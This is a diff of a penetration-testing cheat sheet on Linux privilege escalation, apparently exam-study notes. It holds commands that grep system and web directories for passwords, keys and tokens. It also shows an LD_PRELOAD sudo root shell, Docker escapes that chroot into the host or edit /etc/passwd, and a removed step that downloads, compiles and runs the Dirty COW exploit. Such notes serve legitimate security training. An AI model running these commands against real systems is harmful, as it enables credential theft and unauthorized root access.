@@ -42,8 +42,10 @@ lsb_release -a
 ps aux
 ```
 
-## Monitor processes continuously with pspy
-https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+## Monitor processes with pspy (Source)
+```
+https://github.com/DominicBreuker/pspy
+```
 Transfer to target and run.
 Use `timeout 20 ./pspy64` to end after 20 seconds (otherwise can only exit with CTRL+C which will kill most reverse shells)
 
@@ -115,6 +117,9 @@ yum list installed
 
 # Credential Hunting
 https://osintteam.blog/oscp-exam-success-10-must-know-commands-and-tools-every-pentester-should-master-4b514bf64ccd
+
+## Look in /, /opt, /tmp, /var for unusual files
+
 ## grep /etc for "password"
 ```
 grep -rni 'password' /etc 2>/dev/null
@@ -130,15 +135,17 @@ grep -rni 'PRIVATE KEY' /home 2>/dev/null
 grep -Horn password /var/www
 ```
 
-## grep Credential Hunt All
+## grep Credential Hunt /etc
 ```
 grep -rni --color=always 'password\|secret\|key\|token' /etc 2>/dev/null
 ```
 
-## find credential hunting
+## Find .bak,.zip,.tar.gz Backups and Archives
+Use zip2john and crack if applicable.
 ```
-find / -type f -exec grep -i -I "pass\|cred\|key\|secret" {} /dev/null \;
+find / -regextype posix-egrep -regex ".*\.(bak|zip|tar|gz)$"
 ```
+``
 
 ## Find nonempty directories
 Automated tools may miss unusual directories. Same time when `tree` isn't available.
@@ -209,8 +216,11 @@ unix-privesc-check detailed > output.txt
 ```
 
 
-## LinPEAS 
-/usr/share/peass/linpeas/linpeas.sh on kali. Transfer to target and tee to output file.
+## LinPEAS (Kali Source)
+```
+/usr/share/peass/linpeas/linpeas.sh
+```
+on kali. Transfer to target and tee to output file.
 
 ## Download and run LinEnum
 
@@ -264,23 +274,6 @@ gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so apache2
 ```
 
-## Search for database configuration files
-```bash
-find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | grep -E "(database|db|mysql|postgres|mongo)"
-```
-
-## Search for web application configs
-```bash
-find /var/www -name "*.php" -o -name "*.config" -o -name "*.ini" 2>/dev/null
-grep -r "password\|passwd\|pwd" /var/www/ 2>/dev/null
-```
-
-## Search for credentials in common config locations
-```bash
-grep -r "password\|passwd\|pwd\|pass" /etc/ 2>/dev/null
-grep -r "DB_PASSWORD\|DATABASE_PASSWORD" /var/www/ 2>/dev/null
-```
-
 ## Check bash history for credentials
 ```bash
 cat ~/.bash_history
@@ -290,30 +283,10 @@ cat ~/.vim_history
 find /home -name ".*history" 2>/dev/null
 ```
 
-## Search for SSH private keys
-```bash
-find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
-find / -name "authorized_keys" 2>/dev/null
-find /home -name ".ssh" 2>/dev/null
-```
-
-## Compile and run Dirty COW exploit
-```bash
-curl -o dirty.c https://www.exploit-db.com/download/40611
-gcc -pthread dirty.c -o dirty -lcrypt
-./dirty password123
-```
-
 ## Escape Docker container to host root
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 docker run --rm -v /etc:/mnt/etc -it alpine vi /mnt/etc/passwd
-```
-
-## Check if user is in docker group
-```bash
-id | grep docker
-groups | grep docker
 ```
 
 ## Access MySQL as root and execute shell
@@ -404,7 +377,7 @@ Always create backup shells immediately after initial access:
 - [ ] Kernel exploits (risk of system crash)
 
 ### GTFOBins Reference
-When you find SUID binaries or sudo permissions, always check:
+When you find SUID binaries or sudo permissions, always check 
 - https://gtfobins.github.io/#+suid
 - https://gtfobins.github.io/#+sudo
 - https://gtfobins.github.io/#+capabilities
